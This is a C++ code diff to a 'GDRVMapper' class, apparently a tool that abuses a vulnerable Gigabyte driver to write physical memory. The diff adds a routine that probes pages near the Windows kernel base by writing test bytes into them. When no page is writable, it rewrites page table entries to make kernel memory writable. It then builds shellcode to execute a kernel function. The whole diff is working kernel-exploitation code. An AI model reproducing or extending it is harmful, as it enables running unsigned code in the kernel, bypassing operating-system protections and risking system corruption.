@@ -12,7 +12,8 @@ GDRVMapper::GDRVMapper() :
     exFreePoolAddress(0),
     lastAllocationEnd(0),
     kernelBase(0),
-    kernelSize(0)
+    kernelSize(0),
+    cachedWritableAddr(0)
 {
 }
 
@@ -102,11 +103,63 @@ bool GDRVMapper::WritePhysicalMemory(uint64_t physAddress, const void* buffer, s
     return false;
 }
 
-bool GDRVMapper::ExecuteBootstrapShellcode(uint64_t functionAddr, uint64_t* result) {
-    // Use a hardcoded guess at a good address that's likely writable (deep in ntoskrnl)
-    uint64_t scratchAddr = ntoskrnlBase + 0x200000; // Offset into ntoskrnl data region
+uint64_t GDRVMapper::TryWritableRegion(uint64_t startAddr) {
+    // Check cached address first
+    if (cachedWritableAddr != 0) {
+        std::vector<uint8_t> testPattern = { 0xDE, 0xAD, 0xBE, 0xEF };
+        if (WritePhysicalMemory(cachedWritableAddr, testPattern.data(), testPattern.size())) {
+            std::cout << "[+] Using cached writable memory at 0x" << std::hex << cachedWritableAddr << std::dec << std::endl;
+            return cachedWritableAddr;
+        }
+        // Clear cache if it's no longer writable
+        cachedWritableAddr = 0;
+    }
+
+    std::cout << "[*] Searching for writable memory starting at 0x" << std::hex << startAddr << std::dec << std::endl;
     
-    std::cout << "[*] Attempting bootstrap shellcode execution at 0x" << std::hex << scratchAddr << std::dec << std::endl;
+    // Try scanning a few pages
+    std::vector<uint8_t> testPattern = { 0xDE, 0xAD, 0xBE, 0xEF };
+    for (int i = 0; i < 8; i++) {
+        uint64_t tryAddr = startAddr + (i * 0x1000);
+        std::cout << "[*] Probing address 0x" << std::hex << tryAddr << std::dec << std::endl;
+        
+        if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size())) {
+            std::cout << "[+] Found writable memory at 0x" << std::hex << tryAddr << std::dec << std::endl;
+            cachedWritableAddr = tryAddr;  // Cache the successful address
+            return tryAddr;
+        }
+    }
+    
+    std::cerr << "[-] Failed to find writable memory by brute force" << std::endl;
+    return 0;
+}
+
+bool GDRVMapper::ExecuteBootstrapShellcode(uint64_t functionAddr, uint64_t* result) {
+    // Try finding writable memory at a lower offset from ntoskrnl
+    uint64_t scratchAddr = TryWritableRegion(ntoskrnlBase + 0x100000);
+    
+    // If that fails, try making memory writable via PTE
+    if (!scratchAddr) {
+        scratchAddr = ntoskrnlBase + 0x100000;  // Use fixed address
+        std::cout << "[*] Attempting to make memory writable at 0x" << std::hex << scratchAddr << std::dec << std::endl;
+        
+        if (!PageTableUtils::MakeMemoryWritable(
+            scratchAddr,
+            [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
+            [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
+            nullptr  // Pass null to avoid recursion
+        )) {
+            std::cerr << "[-] Failed to make bootstrap memory writable" << std::endl;
+            return false;
+        }
+        
+        // Try writing to it again
+        std::vector<uint8_t> testPattern = { 0xDE, 0xAD, 0xBE, 0xEF };
+        if (!WritePhysicalMemory(scratchAddr, testPattern.data(), testPattern.size())) {
+            std::cerr << "[-] Failed to write to memory even after PTE modification" << std::endl;
+            return false;
+        }
+    }
     
     // Create minimal shellcode that just calls a function and returns the value
     auto shellcode = ShellcodeUtils::CreateFastReturnShellcode(functionAddr);
